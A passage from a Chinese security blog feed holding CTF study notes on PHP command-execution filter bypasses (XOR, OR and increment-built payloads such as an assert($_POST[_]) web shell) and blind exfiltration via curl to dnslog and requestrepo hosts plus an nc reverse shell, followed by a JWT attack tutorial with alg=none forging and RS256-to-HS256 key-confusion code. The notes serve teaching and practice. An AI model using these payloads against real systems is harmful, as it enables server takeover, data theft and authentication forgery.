class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="或or"><a href="#或or" class="headerlink" title="或or"></a>或or</h3><p>原理与异或一致，利用符号<code>|</code>来构造</p><p>或运算就是有一为一，都是零就是零，比如说<code>3|10</code>，就是<code>0011|1010</code>，结果为<code>1011</code></p><p>脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/* author yu22x */</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>                <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>                <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>                <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                        <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>                &#125;<br>        &#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>利用PHP中的<a href="https://www.php.net/manual/zh/language.operators.increment.php">递增&#x2F;递减运算符</a>，也就是说<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code></p><p>然后利用php强制输出数组时，数组会被转换成字符串<code>Array</code>，拿到<code>A</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/zizeng.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//测试发现7.0.12以上版本不可使用</span><br><span class="hljs-comment">//使用时需要url编码下</span><br><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br>固定格式 构造出来的 <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[_]);<br>然后post传入   _=<span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure><p>CTFSHOW无字符RCE挑战中有更深入的利用方法</p><h1 id="无回显情况的几种利用方式"><a href="#无回显情况的几种利用方式" class="headerlink" title="无回显情况的几种利用方式"></a>无回显情况的几种利用方式</h1><p>题目中较常见的是<code>shell_exec</code>函数，与<code>system</code>函数相比，前者没有回显结果</p><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>当有写入的权限时，可以考虑将结果写到文件中</p><p>例如：<code>ls&gt;1.txt;</code></p><h2 id="dns外带信息"><a href="#dns外带信息" class="headerlink" title="dns外带信息"></a>dns外带信息</h2><p>假设目标没有写的权限，但是出网，就可以考虑使用dns外带信息，常用的平台有<code>http://dnslog.cn/</code></p><p>例如我们生成一个域名<code>c9n9j5.dnslog.cn</code>，然后在靶机上执行<code>curl `whoami`.c9n9j5.dnslog.cn</code></p><p>刷新后就会在平台上返回结果</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/dnslog.png"></p><h2 id="http外带信息"><a href="#http外带信息" class="headerlink" title="http外带信息"></a>http外带信息</h2><p>实际上在dnslog外带信息的同时，有许多不方便之处，比如不支持换行，url中没有的字符不显示等等</p><p>所以可以用http的方式，推荐一个平台<code>https://requestrepo.com/#/</code>，用来接收get，post请求等</p><p>在靶机上执行<code>curl http://mt2dyif2.requestrepo.com/?1=`whoami` </code>，过一会在平台上就会有请求返回(子域名是随机生成的)</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/http.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>不回显的利用方式肯定少不了最经典的反弹shell</p><p>常规反弹语句：<code>nc ip port -e /bin/sh</code>，监听：<code>nc -lvnp port</code></p><p>反弹的姿势非常多，不知道利用什么方式时可以用比较通用的方式<code>https://your-shell.com/</code></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>当靶机不出网，没有写入权限，没有回显时，可以采用类似sql时间盲注的方法</p><p>原理很简单，就是猜字符如果猜中，就延时若干秒，坏处是非常耗时</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;部分题目环境&amp;amp;脚本&amp;amp;姿势来自&lt;code&gt;https://ctf.show/&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;headerlink&quot; title=&quot;命令执行&quot;&gt;&lt;/a&gt;命令执行&lt;/h1&gt;&lt;h2 i</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="rce" scheme="https://www.lewiserii.top/tags/rce/"/>
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>JWT常见安全问题学习总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/JWT%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/JWT%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</id>
    <published>2023-01-05T02:00:00.000Z</published>
    <updated>2023-02-15T05:17:50.113Z</updated>
    
    <content type="html"><![CDATA[<p>Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准(<a href="https://datatracker.ietf.org/doc/html/rfc7519">RFC 7519</a>)。它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象，特别适用于分布式站点的单点登录(SSO)场景。</p><h1 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h1><p>jwt由三部分组成：<code>header</code>、<code>payload</code>、<code>signature</code>，用点<code>.</code>分隔</p><h2 id="header"><a href="#header" class="headerlink" title="header"></a>header</h2><p><code>header</code>用来声明<code>token</code>的类型和签名用的算法等</p><p>示例</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>经过<code>Base64Url</code>编码后构成了<code>JWT</code>的第一部分</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><code>payload</code>就是存放有效信息的地方</p><p>示例</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1234567890&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;John Doe&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>它的声明有三类：已注册声明（Registered claims），公共声明（public claims）， 私人声明（private claims）</p><p>其中已注册声明有7个默认字段，都由官方所定义(<a href="https://www.rfc-editor.org/rfc/rfc7519#section-4.1">参考rfc7519</a>)，但并不都是必需的</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">iss (issuer)：JWT的发行者<br>exp (expiration time)：过期时间<br>sub (subject)：JWT面向的主题<br>aud (audience)：JWT的用户<br>nbf (Not Before)：生效时间<br>iat (Issued At)：签发时间<br>jti (JWT ID)：JWT唯一标识<br></code></pre></td></tr></table></figure><p><code>公共声明</code>：这些可以由使用JWT的人随意定义。但是为了避免冲突，它们应该在IANA JSON Web令牌注册表中定义，或者定义为包含抗冲突命名空间的 URI。<br><code>私人声明</code>：这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，既不是注册声明也不是公共声明</p><p>经过<code>Base64Url</code>编码后构成了<code>JWT</code>的第二部分</p><h2 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h2><p>签名用于验证消息在此过程中没有被更改</p><p>这个部分需要<code>Base64Url</code>编码后的<code>header</code>和<code>Base64Url</code>编码后的<code>payload</code>使用<code>.</code>连接，组成字符串，然后通过<code>header</code>中声明的加密方式进行加盐<code>secret</code>组合加密，然后就构成了<code>jwt</code>的第三部分</p><p>如果要使用<code>HMAC SHA256</code>算法，将按以下方式创建签名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SHA256">HMACSHA256(<br>  base64UrlEncode(header) + &quot;.&quot; +<br>  base64UrlEncode(payload),<br>  secret)<br></code></pre></td></tr></table></figure><p>secret是保存在服务端的，jwt的签发生成也是在服务端的，secret就是用来进行jwt的签发和jwt的验证，所以一旦客户端得知这个secret, 那就意味着客户端可以自我签发jwt了</p><h1 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h1><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>因为<code>payload</code>和<code>header</code>只经过<code>Base64Url</code>编码，如果开发者把一些敏感信息存放到里面，我们可以轻松获得</p><h2 id="未校验签名"><a href="#未校验签名" class="headerlink" title="未校验签名"></a>未校验签名</h2><p>某些服务端并未校验JWT签名，所以，可以尝试修改<code>signature</code>后(或者直接删除<code>signature</code>)看其是否还有效。</p><h2 id="签名算法置空-CVE-2015-2951"><a href="#签名算法置空-CVE-2015-2951" class="headerlink" title="签名算法置空(CVE-2015-2951)"></a>签名算法置空(CVE-2015-2951)</h2><p>我们知道，签名算法可以确保JWT在传输过程中不会被恶意用户所篡改</p><p>但头部中的<code>alg</code>字段却可以改为<code>none</code>，服务端接收到后会将其认定为无加密算法， 于是对<code>signature</code>的检验也就失效了，那么我们就可以随意修改<code>payload</code>部分伪造<code>token</code></p><p>因为<code>jwt.io</code>将<code>alg</code>为<code>none</code>视为恶意行为，所以无法通过在线工具生成JWT，可以用<code>python</code>的<code>jwt</code>库来实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><br><br>token_dict = &#123;<br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1674031091</span>,<br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1674038291</span>,<br>  <span class="hljs-string">&quot;nbf&quot;</span>: <span class="hljs-number">1674031091</span>,<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;jti&quot;</span>: <span class="hljs-string">&quot;e41ff441b04bf337ab3ca715f64a76e1&quot;</span><br>&#125;<br><br>headers = &#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br><br><br>jwt_token = jwt.encode(token_dict,<br>                       <span class="hljs-string">&quot;&quot;</span>,   <span class="hljs-comment"># 进行加密签名的密钥</span><br>                       algorithm=<span class="hljs-string">&quot;none&quot;</span>,   <span class="hljs-comment"># 指明签名算法方式, 默认也是HS256</span><br>                       headers=headers<br>                       )<br><br><span class="hljs-built_in">print</span>(jwt_token)<br></code></pre></td></tr></table></figure><p>运行结果<br><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3NDAzMTA5MSwiZXhwIjoxNjc0MDM4MjkxLCJuYmYiOjE2NzQwMzEwOTEsInN1YiI6ImFkbWluIiwianRpIjoiZTQxZmY0NDFiMDRiZjMzN2FiM2NhNzE1ZjY0YTc2ZTEifQ.</code></p><h2 id="签名密钥爆破"><a href="#签名密钥爆破" class="headerlink" title="签名密钥爆破"></a>签名密钥爆破</h2><p>JWT使用算法对<code>header</code>和<code>payload</code>进行加密，如果我们可以爆破出加密密钥，那么也就可以随意修改<code>token</code>了</p><p><a href="https://github.com/Ch1ngg/JWTPyCrack">Github-jwt爆破脚本</a></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/jwt/jwt-1.png"></p><h2 id="非对称密码算法-x3D-gt-对称密码算法-CVE-2016-10555"><a href="#非对称密码算法-x3D-gt-对称密码算法-CVE-2016-10555" class="headerlink" title="非对称密码算法&#x3D;&gt;对称密码算法(CVE-2016-10555)"></a>非对称密码算法&#x3D;&gt;对称密码算法(CVE-2016-10555)</h2><p>JWT的签名加密算法有两种，对称加密算法和非对称加密算法</p><p>对称加密算法比如HS256使用密钥为所有消息进行签名和验证<br>非对称加密算法比如RS256使用私钥对消息进行签名并使用公钥进行身份验证</p><p>如果我们获取到了公钥，可以将头部中的算法修改从<code>RS256</code>更改为<code>HS256</code>，这样后端代码就会使用<code>RSA</code>公钥+<code>HS256</code>算法进行签名验证</p><p>js代码实现例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;public.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure><p>python代码实现例子</p><p>不过用python跑的时候因为jwt版本过高会报错<code>The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret</code><br>解决方法：<code>pip install pyjwt==0.4.3</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>public = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;public.pem&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-built_in">print</span>(jwt.encode(&#123;<span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;, key=public, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>))<br></code></pre></td></tr></table></figure><h2 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h2><p>因为<code>非对称加密算法</code>利用私钥生成<code>jwt</code>，利用公钥解密<code>jwt</code>，所以我们只要有私钥然后自己就可以重新生成</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure><p>如果运行报错<code>Error: secretOrPrivateKey has a minimum key size of 2048 bits for RS256</code><br>可以强行注释<code>node_modules\jsonwebtoken\sign.js</code>中对于密钥长度的判断</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/jwt/jwt-2.png"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>听说还有通过KID实现任意文件读取，注入等操作，CVE-2018-0114，CVE-2022-39227，下次抽空研究下</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><a href="https://jwt.io/">jwtio</a><br><a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a><br><a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p><p>参考文章：<br><a href="https://xz.aliyun.com/t/2338">JSON Web Token (JWT) 攻击技巧</a><br><a href="https://www.cnblogs.com/yokan/p/14468030.html">JWT原理及常见攻击方式</a><br><a 